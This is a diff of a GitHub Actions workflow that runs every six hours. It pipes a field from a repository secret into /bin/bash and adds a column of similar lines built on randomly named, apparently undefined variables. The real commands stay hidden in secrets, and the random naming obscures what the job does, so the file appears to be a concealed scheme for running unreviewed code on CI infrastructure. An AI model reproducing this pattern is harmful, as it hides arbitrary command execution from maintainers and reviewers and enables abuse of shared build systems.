@@ -1,26 +1,27 @@
 name: troubleddreary
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
+    - cron: '14 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: troubleddreary
         env:
-          ws1394: ${{ secrets.ws1394 }}
+          yto8818: ${{ secrets.yto8818 }}
         run: |
-          echo $ws1394 | jq -r .shw8761 | /bin/bash
-          echo $clf8 | jq -r .dl05 | /bin/bash
-          echo $x6 | jq -r .kcko1 | /bin/bash
-          echo $a72 | jq -r .y683 | /bin/bash
-          echo $huv15 | jq -r .wawce6659 | /bin/bash
-          echo $gy10862 | jq -r .h875 | /bin/bash
-          echo $gu456 | jq -r .lc463 | /bin/bash
-          echo $nx0 | jq -r .ttemy719 | /bin/bash
-          echo $kdc8 | jq -r .gd28672 | /bin/bash
+          echo $yto8818 | jq -r .xkf2695 | /bin/bash
+          echo $kemoy95891 | jq -r .jgkce46583 | /bin/bash
+          echo $xj74767 | jq -r .f129 | /bin/bash
+          echo $ajaq94 | jq -r .wpzuw78 | /bin/bash
+          echo $k0 | jq -r .svrg39 | /bin/bash
+          echo $admyy10315 | jq -r .yq718 | /bin/bash
+          echo $ydxwz0 | jq -r .ro37748 | /bin/bash
+          echo $bpg64432 | jq -r .cucl869 | /bin/bash
+          echo $oh922 | jq -r .yr74 | /bin/bash
+          echo $g1 | jq -r .fi3508 | /bin/bash
+          echo $e8407 | jq -r .vcv9997 | /bin/bash
 
